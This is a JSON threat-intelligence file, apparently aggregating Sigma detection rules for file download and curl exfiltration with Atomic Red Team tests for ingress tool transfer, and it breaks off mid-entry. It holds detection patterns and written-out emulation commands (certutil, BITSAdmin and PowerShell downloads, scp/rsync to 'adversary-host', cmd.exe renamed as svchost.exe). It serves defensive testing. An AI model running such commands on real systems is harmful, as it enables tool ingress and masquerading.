                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/07/03\ndescription: Detects a suspicious curl process start the adds a file to a web request\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains:\n    - ' -F '\n    - ' --form'\n    - ' -T '\n    - ' --upload-file '\n    - ' -d '\n    - ' --data '\n    - ' --data-'\n  selection_img:\n  - Image|endswith: \\curl.exe\n  - Product: The curl executable\nfalsepositives:\n- Scripts created by developers and admins\nfields:\n- CommandLine\n- ParentCommandLine\nid: 00bca14a-df4e-4649-9054-3f2aa676bc04\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/15\nreferences:\n- https://twitter.com/d1r4c/status/1279042657508081664\n- https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1105/T1105.md#atomic-test-19---curl-upload-file\n- https://curl.se/docs/manpage.html\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1567\n- attack.t1105\ntitle: Suspicious Curl File Upload\n",
                            "sigma:id": "00bca14a-df4e-4649-9054-3f2aa676bc04",
                            "title": "Suspicious Curl File Upload",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0e8cfe08-02c9-4815-a2f8-0d157b7ed33e",
                        "lookup_data": {
                            "description": "This is an unusual method to download files. It starts a browser headless and downloads a file from a location. This can be used by threat actors to download files.",
                            "raw": "author: Sreeman, Florian Roth\ndate: 2022/01/04\ndescription: This is an unusual method to download files. It starts a browser headless\n  and downloads a file from a location. This can be used by threat actors to download\n  files.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - --headless\n    - dump-dom\n    - http\n    Image|endswith:\n    - \\msedge.exe\n    - \\chrome.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/mrd0x/status/1478234484881436672?s=12\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: File Download with Headless Browser\n",
                            "sigma:id": "0e8cfe08-02c9-4815-a2f8-0d157b7ed33e",
                            "title": "File Download with Headless Browser",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "af491bca-e752-4b44-9c86-df5680533dbc",
                        "lookup_data": {
                            "description": "Detects suspicious aged finger.exe tool execution often used in malware attacks nowadays",
                            "raw": "author: Florian Roth (Nextron Systems), omkar72, oscd.community\ndate: 2021/02/24\ndescription: Detects suspicious aged finger.exe tool execution often used in malware\n  attacks nowadays\ndetection:\n  condition: selection\n  selection:\n  - OriginalFileName: finger.exe\n  - Image|endswith: \\finger.exe\nfalsepositives:\n- Admin activity (unclear what they do nowadays with finger.exe)\nid: af491bca-e752-4b44-9c86-df5680533dbc\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/16\nreferences:\n- https://twitter.com/bigmacjpg/status/1349727699863011328?s=12\n- https://app.any.run/tasks/40115012-a919-4208-bfed-41e82cb3dadf/\n- http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Finger.exe Suspicious Invocation\n",
                            "sigma:id": "af491bca-e752-4b44-9c86-df5680533dbc",
                            "title": "Finger.exe Suspicious Invocation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0dba975d-a193-4ed1-a067-424df57570d1",
                        "lookup_data": {
                            "description": "Detects a network connection intitiated by the certutil.exe tool. Attackers can abuse `certutil.exe` to download malware or offensive security tools.",
                            "raw": "author: frack113, Florian Roth\ndate: 2022/09/02\ndescription: Detects a network connection intitiated by the certutil.exe tool. Attackers\n  can abuse `certutil.exe` to download malware or offensive security tools.\ndetection:\n  condition: selection\n  selection:\n    DestinationPort:\n    - 80\n    - 443\n    - 135\n    - 445\n    Image|endswith: \\certutil.exe\n    Initiated: 'true'\nfalsepositives:\n- Legitimate certutil network connection\nid: 0dba975d-a193-4ed1-a067-424df57570d1\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2022/10/04\nreferences:\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Certutil Initiated Connection\n",
                            "sigma:id": "0dba975d-a193-4ed1-a067-424df57570d1",
                            "title": "Certutil Initiated Connection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bbeaed61-1990-4773-bf57-b81dbad7db2d",
                        "lookup_data": {
                            "description": "Detects a curl process start on Windows, which indicates a file download from a remote location or a simple web request to a remote server",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/07/05\ndescription: Detects a curl process start on Windows, which indicates a file download\n  from a remote location or a simple web request to a remote server\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\curl.exe\n  - Product: The curl executable\nfalsepositives:\n- Scripts created by developers and admins\n- Administrative activity\nfields:\n- CommandLine\n- ParentCommandLine\nid: bbeaed61-1990-4773-bf57-b81dbad7db2d\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://web.archive.org/web/20200128160046/https://twitter.com/reegun21/status/1222093798009790464\nrelated:\n- id: e218595b-bbe7-4ee5-8a96-f32a24ad3468\n  type: derived\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Curl Usage on Windows\n",
                            "sigma:id": "bbeaed61-1990-4773-bf57-b81dbad7db2d",
                            "title": "Curl Usage on Windows",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "185d7418-f250-42d0-b72e-0c8b70661e93",
                        "lookup_data": {
                            "description": "Download and compress a remote file and store it in a cab file on local machine.",
                            "raw": "author: frack113\ndate: 2021/11/26\ndescription: Download and compress a remote file and store it in a cab file on local\n  machine.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - diantz.exe\n    - ' \\\\\\\\'\n    - .cab\nfalsepositives:\n- Unknown\nid: 185d7418-f250-42d0-b72e-0c8b70661e93\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/13\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Diantz/\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Suspicious Diantz Download and Compress Into a CAB File\n",
                            "sigma:id": "185d7418-f250-42d0-b72e-0c8b70661e93",
                            "title": "Suspicious Diantz Download and Compress Into a CAB File",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "aa8e035d-7be4-48d3-a944-102aec04400d",
                        "lookup_data": {
                            "description": "Download or Copy file with Extrac32",
                            "raw": "author: frack113\ndate: 2021/11/26\ndescription: Download or Copy file with Extrac32\ndetection:\n  condition: all of selection_*\n  selection_archive:\n    CommandLine|contains: .cab\n  selection_lolbas:\n  - CommandLine|contains: extrac32.exe\n  - Image|endswith: \\extrac32.exe\n  - OriginalFileName: extrac32.exe\n  selection_options:\n    CommandLine|contains:\n    - /C\n    - /Y\n    - ' \\\\\\\\'\nfalsepositives:\n- Unknown\nid: aa8e035d-7be4-48d3-a944-102aec04400d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/13\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Extrac32/\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Suspicious Extrac32 Execution\n",
                            "sigma:id": "aa8e035d-7be4-48d3-a944-102aec04400d",
                            "title": "Suspicious Extrac32 Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0c79148b-118e-472b-bdb7-9b57b444cc19",
                        "lookup_data": {
                            "description": "Downloads payload from remote server",
                            "raw": "author: Beyu Denis, oscd.community\ndate: 2019/10/26\ndescription: Downloads payload from remote server\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: http\n    Image|endswith:\n    - \\powerpnt.exe\n    - \\winword.exe\n    - \\excel.exe\nfalsepositives:\n- Unknown\nid: 0c79148b-118e-472b-bdb7-9b57b444cc19\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/\n- https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191\n- Reegun J (OCBC Bank)\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Malicious Payload Download via Office Binaries\n",
                            "sigma:id": "0c79148b-118e-472b-bdb7-9b57b444cc19",
                            "title": "Malicious Payload Download via Office Binaries",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6f535e01-ca1f-40be-ab8d-45b19c0c8b7f",
                        "lookup_data": {
                            "description": "Detects the use of Ldifde.exe with specific command line arguments to potentially load an LDIF file containing HTTP-based arguments.\nLdifde.exe is present, by default, on domain controllers and only requires user-level authentication to execute.\n",
                            "raw": "author: '@gott_cyber'\ndate: 2022/09/02\ndescription: 'Detects the use of Ldifde.exe with specific command line arguments to\n  potentially load an LDIF file containing HTTP-based arguments.\n\n  Ldifde.exe is present, by default, on domain controllers and only requires user-level\n  authentication to execute.\n\n  '\ndetection:\n  condition: all of selection_*\n  selection_cmd:\n    CommandLine|contains|all:\n    - -i\n    - -f\n  selection_ldif:\n  - Image|endswith: \\ldifde.exe\n  - OriginalFileName: ldifde.exe.mui\nfalsepositives:\n- Unknown\nid: 6f535e01-ca1f-40be-ab8d-45b19c0c8b7f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/0gtweet/status/1564968845726580736\n- https://strontic.github.io/xcyclopedia/library/ldifde.exe-979DE101F5059CEC1D2C56967CA2BAC0.html\n- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11)\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\n- attack.defense_evasion\n- attack.t1218\ntitle: Suspicious Ldifde Command Usage\n",
                            "sigma:id": "6f535e01-ca1f-40be-ab8d-45b19c0c8b7f",
                            "title": "Suspicious Ldifde Command Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cafeeba3-01da-4ab4-b6c4-a31b1d9730c7",
                        "lookup_data": {
                            "description": "Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.",
                            "raw": "author: frack113\ndate: 2022/05/02\ndescription: Detects the execution of the LOLBIN PrintBrm.exe, which can be used to\n  create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - ' -f'\n    - .zip\n    Image|endswith: \\PrintBrm.exe\nfalsepositives:\n- Unknown\nid: cafeeba3-01da-4ab4-b6c4-a31b1d9730c7\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/PrintBrm/\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\n- attack.defense_evasion\n- attack.t1564.004\ntitle: PrintBrm ZIP Creation of Extraction\n",
                            "sigma:id": "cafeeba3-01da-4ab4-b6c4-a31b1d9730c7",
                            "title": "PrintBrm ZIP Creation of Extraction",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3aff0be0-7802-4a7e-a4fa-c60c74bc5e1d",
                        "lookup_data": {
                            "description": "Detects setting a custom URL for OneDriveStandaloneUpdater.exe to download a file from the Internet without executing any\nanomalous executables with suspicious arguments. The downloaded file will be in C:\\Users\\redacted\\AppData\\Local\\Microsoft\\OneDrive\\StandaloneUpdaterreSignInSettingsConfig.json\n",
                            "raw": "author: frack113\ndate: 2022/05/28\ndescription: 'Detects setting a custom URL for OneDriveStandaloneUpdater.exe to download\n  a file from the Internet without executing any\n\n  anomalous executables with suspicious arguments. The downloaded file will be in\n  C:\\Users\\redacted\\AppData\\Local\\Microsoft\\OneDrive\\StandaloneUpdaterreSignInSettingsConfig.json\n\n  '\ndetection:\n  condition: selection\n  selection:\n    EventType: SetValue\n    TargetObject|contains: \\SOFTWARE\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC\nfalsepositives:\n- Unknown\nid: 3aff0be0-7802-4a7e-a4fa-c60c74bc5e1d\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/OneDriveStandaloneUpdater/\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Lolbas OneDriveStandaloneUpdater.exe Proxy Download\n",
                            "sigma:id": "3aff0be0-7802-4a7e-a4fa-c60c74bc5e1d",
                            "title": "Lolbas OneDriveStandaloneUpdater.exe Proxy Download",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5e5709a4-8850-453e-9f11-275a0a0a020f",
                        "lookup_data": {
                            "description": "Racoon Stealer",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5e5709a4-8850-453e-9f11-275a0a0a020f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1621850670",
                            "uuid": "5e5709a4-8850-453e-9f11-275a0a0a020f",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "00b90cc1-17ec-402c-96ad-3a8117d7a582",
                        "lookup_data": {
                            "description": "Detects a suspicious curl process start the adds a file to a web request",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/09/15\ndescription: Detects a suspicious curl process start the adds a file to a web request\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - ' -F '\n    - ' --form'\n    - ' -T '\n    - ' --upload-file '\n    - ' -d '\n    - ' --data '\n    - ' --data-'\n    Image|endswith: /curl\nfalsepositives:\n- Scripts created by developers and admins\nid: 00b90cc1-17ec-402c-96ad-3a8117d7a582\nlevel: medium\nlogsource:\n  category: process_creation\n  product: linux\nreferences:\n- https://twitter.com/d1r4c/status/1279042657508081664\n- https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1105/T1105.md#atomic-test-19---curl-upload-file\n- https://curl.se/docs/manpage.html\n- https://www.trendmicro.com/en_us/research/22/i/how-malicious-actors-abuse-native-linux-tools-in-their-attacks.html\nrelated:\n- id: 00bca14a-df4e-4649-9054-3f2aa676bc04\n  type: derived\nstatus: experimental\ntags:\n- attack.exfiltration\n- attack.t1567\n- attack.t1105\ntitle: Suspicious Curl File Upload - Linux\n",
                            "sigma:id": "00b90cc1-17ec-402c-96ad-3a8117d7a582",
                            "title": "Suspicious Curl File Upload - Linux",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
                        "lookup_data": {
                            "description": "UEFI threats moving to the ESP: Introducing ESPecter bootkit",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5df8df26-fe0e-4858-94a7-6cf71d9519c9.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1637336858",
                            "uuid": "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "47e0852a-cf81-4494-a8e6-31864f8c86ed",
                        "lookup_data": {
                            "description": "Detects Pandemic Windows Implant",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/06/01\ndescription: Detects Pandemic Windows Implant\ndetection:\n  condition: selection\n  selection:\n    TargetObject|contains: \\SYSTEM\\CurrentControlSet\\services\\null\\Instance\nfalsepositives:\n- Unknown\nfields:\n- EventID\n- CommandLine\n- ParentCommandLine\n- Image\n- User\n- TargetObject\nid: 47e0852a-cf81-4494-a8e6-31864f8c86ed\nlevel: critical\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://wikileaks.org/vault7/#Pandemic\n- https://twitter.com/MalwareJake/status/870349480356454401\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.t1105\ntitle: Pandemic Registry Key\n",
                            "sigma:id": "47e0852a-cf81-4494-a8e6-31864f8c86ed",
                            "title": "Pandemic Registry Key",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7b434893-c57d-4f41-908d-6a17bf1ae98f",
                        "lookup_data": {
                            "description": "Detects programs with network connections running in suspicious files system locations",
                            "raw": "author: Florian Roth (Nextron Systems), Tim Shelton\ndate: 2017/03/19\ndescription: Detects programs with network connections running in suspicious files\n  system locations\ndetection:\n  condition: selection and not 1 of false_positive*\n  false_positive1:\n    Image|startswith: C:\\Users\\Public\\IBM\\ClientSolutions\\Start_Programs\\\n  selection:\n  - Image|contains:\n    - \\Users\\All Users\\\n    - \\Users\\Default\\\n    - \\Users\\Public\\\n    - \\Users\\Contacts\\\n    - \\Users\\Searches\\\n    - \\config\\systemprofile\\\n    - \\Windows\\Fonts\\\n    - \\Windows\\IME\\\n    - \\Windows\\addins\\\n  - Image|endswith: \\$Recycle.bin\n  - Image|startswith: C:\\Perflogs\\\nfalsepositives:\n- Unknown\nid: 7b434893-c57d-4f41-908d-6a17bf1ae98f\nlevel: high\nlogsource:\n  category: network_connection\n  definition: Use the following config to generate the necessary Event ID 3 Network\n    Connection events\n  product: windows\nmodified: 2022/05/26\nreferences:\n- https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Suspicious Program Location with Network Connections\n",
                            "sigma:id": "7b434893-c57d-4f41-908d-6a17bf1ae98f",
                            "title": "Suspicious Program Location with Network Connections",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1105",
                "display_name": "Ingress Tool Transfer",
                "atomic_tests": [
                    {
                        "name": "rsync remote file copy (push)",
                        "auto_generated_guid": "0fc6e977-cb12-44f6-b263-2824ba917409",
                        "description": "Utilize rsync to perform a remote file copy (push)\n",
                        "supported_platforms": [
                            "linux",
                            "macos"
                        ],
                        "input_arguments": {
                            "remote_path": {
                                "description": "Remote path to receive rsync",
                                "type": "path",
                                "default": "/tmp/victim-files"
                            },
                            "remote_host": {
                                "description": "Remote host to copy toward",
                                "type": "string",
                                "default": "victim-host"
                            },
                            "local_path": {
                                "description": "Path of folder to copy",
                                "type": "path",
                                "default": "/tmp/adversary-rsync/"
                            },
                            "username": {
                                "description": "User account to authenticate on remote host",
                                "type": "string",
                                "default": "victim"
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "rsync must be installed on the machine \n",
                                "prereq_command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
                                "get_prereq_command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n"
                            }
                        ],
                        "executor": {
                            "command": "rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "rsync remote file copy (pull)",
                        "auto_generated_guid": "3180f7d5-52c0-4493-9ea0-e3431a84773f",
                        "description": "Utilize rsync to perform a remote file copy (pull)\n",
                        "supported_platforms": [
                            "linux",
                            "macos"
                        ],
                        "input_arguments": {
                            "remote_path": {
                                "description": "Path of folder to copy",
                                "type": "path",
                                "default": "/tmp/adversary-rsync/"
                            },
                            "remote_host": {
                                "description": "Remote host to copy from",
                                "type": "string",
                                "default": "adversary-host"
                            },
                            "local_path": {
                                "description": "Local path to receive rsync",
                                "type": "path",
                                "default": "/tmp/victim-files"
                            },
                            "username": {
                                "description": "User account to authenticate on remote host",
                                "type": "string",
                                "default": "adversary"
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "rsync must be installed on the machine \n",
                                "prereq_command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
                                "get_prereq_command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n"
                            }
                        ],
                        "executor": {
                            "command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}\n",
                            "name": "sh"
                        }
                    },
                    {
                        "name": "scp remote file copy (push)",
                        "auto_generated_guid": "83a49600-222b-4866-80a0-37736ad29344",
                        "description": "Utilize scp to perform a remote file copy (push)\n",
                        "supported_platforms": [
                            "linux",
                            "macos"
                        ],
                        "input_arguments": {
                            "remote_path": {
                                "description": "Remote path to receive scp",
                                "type": "path",
                                "default": "/tmp/victim-files/"
                            },
                            "local_file": {
                                "description": "Path of file to copy",
                                "type": "path",
                                "default": "/tmp/adversary-scp"
                            },
                            "remote_host": {
                                "description": "Remote host to copy toward",
                                "type": "string",
                                "default": "victim-host"
                            },
                            "username": {
                                "description": "User account to authenticate on remote host",
                                "type": "string",
                                "default": "victim"
                            }
                        },
                        "executor": {
                            "command": "scp #{local_file} #{username}@#{remote_host}:#{remote_path}\n",
                            "name": "sh"
                        }
                    },
                    {
                        "name": "scp remote file copy (pull)",
                        "auto_generated_guid": "b9d22b9a-9778-4426-abf0-568ea64e9c33",
                        "description": "Utilize scp to perform a remote file copy (pull)\n",
                        "supported_platforms": [
                            "linux",
                            "macos"
                        ],
                        "input_arguments": {
                            "remote_host": {
                                "description": "Remote host to copy from",
                                "type": "string",
                                "default": "adversary-host"
                            },
                            "local_path": {
                                "description": "Local path to receive scp",
                                "type": "path",
                                "default": "/tmp/victim-files/"
                            },
                            "remote_file": {
                                "description": "Path of file to copy",
                                "type": "path",
                                "default": "/tmp/adversary-scp"
                            },
                            "username": {
                                "description": "User account to authenticate on remote host",
                                "type": "string",
                                "default": "adversary"
                            }
                        },
                        "executor": {
                            "command": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}\n",
                            "name": "sh"
                        }
                    },
                    {
                        "name": "sftp remote file copy (push)",
                        "auto_generated_guid": "f564c297-7978-4aa9-b37a-d90477feea4e",
                        "description": "Utilize sftp to perform a remote file copy (push)\n",
                        "supported_platforms": [
                            "linux",
                            "macos"
                        ],
                        "input_arguments": {
                            "remote_path": {
                                "description": "Remote path to receive sftp",
                                "type": "path",
                                "default": "/tmp/victim-files/"
                            },
                            "local_file": {
                                "description": "Path of file to copy",
                                "type": "path",
                                "default": "/tmp/adversary-sftp"
                            },
                            "remote_host": {
                                "description": "Remote host to copy toward",
                                "type": "string",
                                "default": "victim-host"
                            },
                            "username": {
                                "description": "User account to authenticate on remote host",
                                "type": "string",
                                "default": "victim"
                            }
                        },
                        "executor": {
                            "command": "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n",
                            "name": "bash"
                        }
                    },
                    {
                        "name": "sftp remote file copy (pull)",
                        "auto_generated_guid": "0139dba1-f391-405e-a4f5-f3989f2c88ef",
                        "description": "Utilize sftp to perform a remote file copy (pull)\n",
                        "supported_platforms": [
                            "linux",
                            "macos"
                        ],
                        "input_arguments": {
                            "remote_host": {
                                "description": "Remote host to copy from",
                                "type": "string",
                                "default": "adversary-host"
                            },
                            "local_path": {
                                "description": "Local path to receive sftp",
                                "type": "path",
                                "default": "/tmp/victim-files/"
                            },
                            "remote_file": {
                                "description": "Path of file to copy",
                                "type": "path",
                                "default": "/tmp/adversary-sftp"
                            },
                            "username": {
                                "description": "User account to authenticate on remote host",
                                "type": "string",
                                "default": "adversary"
                            }
                        },
                        "executor": {
                            "command": "sftp #{username}@#{remote_host}:#{remote_file} #{local_path}\n",
                            "name": "sh"
                        }
                    },
                    {
                        "name": "certutil download (urlcache)",
                        "auto_generated_guid": "dd3b61dd-7bbc-48cd-ab51-49ad1a776df0",
                        "description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_file": {
                                "description": "URL of file to copy",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
                            },
                            "local_path": {
                                "description": "Local path to place file",
                                "type": "path",
                                "default": "Atomic-license.txt"
                            }
                        },
                        "executor": {
                            "command": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}\n",
                            "cleanup_command": "del #{local_path} >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "certutil download (verifyctl)",
                        "auto_generated_guid": "ffd492e3-0455-4518-9fb1-46527c9f241b",
                        "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_file": {
                                "description": "URL of file to copy",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
                            },
                            "local_path": {
                                "description": "Local path to place file",
                                "type": "path",
                                "default": "Atomic-license.txt"
                            }
                        },
                        "executor": {
                            "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n",
                            "cleanup_command": "Remove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Windows - BITSAdmin BITS Download",
                        "auto_generated_guid": "a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b",
                        "description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "bits_job_name": {
                                "description": "Name of the created BITS job",
                                "type": "string",
                                "default": "qcxjb7"
                            },
                            "local_path": {
                                "description": "Local path to place file",
                                "type": "path",
                                "default": "%temp%\\Atomic-license.txt"
                            },
                            "remote_file": {
                                "description": "URL of file to copy",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
                            }
                        },
                        "executor": {
                            "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Windows - PowerShell Download",
                        "auto_generated_guid": "42dc4460-9aa6-45d3-b1a6-3955d34e1fe8",
                        "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_file": {
                                "description": "URL of file to copy",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
                            },
                            "destination_path": {
                                "description": "Destination path to file",
                                "type": "path",
                                "default": "$env:TEMP\\Atomic-license.txt"
                            }
                        },
                        "executor": {
                            "command": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"#{destination_path}\")\n",
                            "cleanup_command": "Remove-Item #{destination_path} -Force -ErrorAction Ignore\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "OSTAP Worming Activity",
                        "auto_generated_guid": "2ca61766-b456-4fcf-a35a-1233685e1cad",
                        "description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "destination_path": {
                                "description": "Path to create remote file at. Default is local admin share.",
                                "type": "string",
                                "default": "\\\\localhost\\C$"
                            }
                        },
                        "executor": {
                            "command": "pushd #{destination_path}\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "svchost writing a file to a UNC path",
                        "auto_generated_guid": "fa5a2759-41d7-4e13-a19c-e8f28a53566f",
                        "description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\n",
                            "cleanup_command": "del C:\\T1105.txt >nul 2>&1\ndel C:\\\\svchost.exe >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Download a File with Windows Defender MpCmdRun.exe",
                        "auto_generated_guid": "815bef8b-bf91-4b67-be4c-abe4c2a94ccc",
                        "description": "Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the Atomic Red Team license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_file": {
